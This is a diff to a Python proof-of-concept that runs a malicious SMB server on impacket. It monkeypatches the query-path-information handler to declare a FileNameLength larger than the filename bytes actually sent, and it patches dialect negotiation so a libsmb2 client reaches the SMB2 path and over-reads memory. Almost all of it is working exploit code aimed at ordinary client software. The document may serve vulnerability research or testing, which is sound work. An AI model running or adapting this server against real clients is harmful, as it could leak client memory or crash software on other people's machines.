@@ -37,6 +37,69 @@ def patched(connId, smbServer, recvPacket):
 
 
 SMB2Commands.smb2QueryInfo = staticmethod(patched)
+
+# The client falls back to SMB1 on this impacket build, so the SMB2 patch alone
+# never fires. queryPathInformation is the module-level builder both paths use;
+# inflate FileNameLength there so the over-read happens on either dialect.
+import impacket.smbserver as _S
+from impacket.structure import Structure
+
+
+class BadAllInfo(Structure):
+    """SMBQueryFileAllInfo with FileNameLength no longer derived from FileName,
+    so the declared length can exceed the bytes actually present."""
+    structure = (
+        ('CreationTime', '<q'), ('LastAccessTime', '<q'), ('LastWriteTime', '<q'),
+        ('LastChangeTime', '<q'), ('ExtFileAttributes', '<L'), ('Reserved', '<L=0'),
+        ('AllocationSize', '<q'), ('EndOfFile', '<q'), ('NumberOfLinks', '<L=0'),
+        ('DeletePending', '<B=0'), ('Directory', '<B'), ('Reserved2', '<H=0'),
+        ('EaSize', '<L=0'), ('FileNameLength', '<L'), ('FileName', ':'),
+    )
+_ORIG_QPI = _S.queryPathInformation
+
+
+def patched_qpi(path, filename, level):
+    print('QPI level=%d file=%r' % (level, filename), flush=True)
+    rec, err = _ORIG_QPI(path, filename, level)
+    try:
+        if rec is not None and type(rec).__name__ == 'SMBQueryFileAllInfo':
+            bad = BadAllInfo()
+            for k in ('CreationTime', 'LastAccessTime', 'LastWriteTime', 'LastChangeTime',
+                      'ExtFileAttributes', 'AllocationSize', 'EndOfFile', 'Directory'):
+                bad[k] = rec[k]
+            bad['FileName'] = rec['FileName']
+            bad['FileNameLength'] = len(rec['FileName']) + 2 * DELTA
+            print('QINFO-SMB1 fnlen=%d real=%d' % (bad['FileNameLength'], len(rec['FileName'])), flush=True)
+            rec = bad
+        elif rec is not None and 'FileNameLength' in getattr(rec, 'fields', {}):
+            rec['FileNameLength'] = rec['FileNameLength'] + 2 * DELTA
+            rec['FileName'] = rec['FileName'] + b'\x00' * (2 * DELTA)
+            print('QINFO-SMB2 fnlen=%d' % rec['FileNameLength'], flush=True)
+    except Exception as e:
+        print('err', repr(e), flush=True)
+    return rec, err
+
+
+_S.queryPathInformation = patched_qpi
+
+# libsmb2 opens with an SMB1 NEGOTIATE whose dialect list impacket does not
+# recognise ("SMB2 not supported, fallbacking"), so the SMB2 path never runs.
+# Add the dialect impacket wants before it looks.
+_ORIG_NEG = SMB2Commands.smb2Negotiate
+
+
+def patched_neg(connId, smbServer, recvPacket, isSMB1=False):
+    try:
+        if isSMB1:
+            cmd = recvPacket['Data'][0]
+            if b'SMB 2.002\x00' not in cmd['Data']:
+                cmd['Data'] = cmd['Data'] + b'\x02SMB 2.002\x00'
+    except Exception:
+        pass
+    return _ORIG_NEG(connId, smbServer, recvPacket, isSMB1)
+
+
+SMB2Commands.smb2Negotiate = staticmethod(patched_neg)
 srv = SimpleSMBServer(listenAddress='0.0.0.0', listenPort=PORT)
 srv.addShare('S', SHARE)
 srv.setSMB2Support(True)
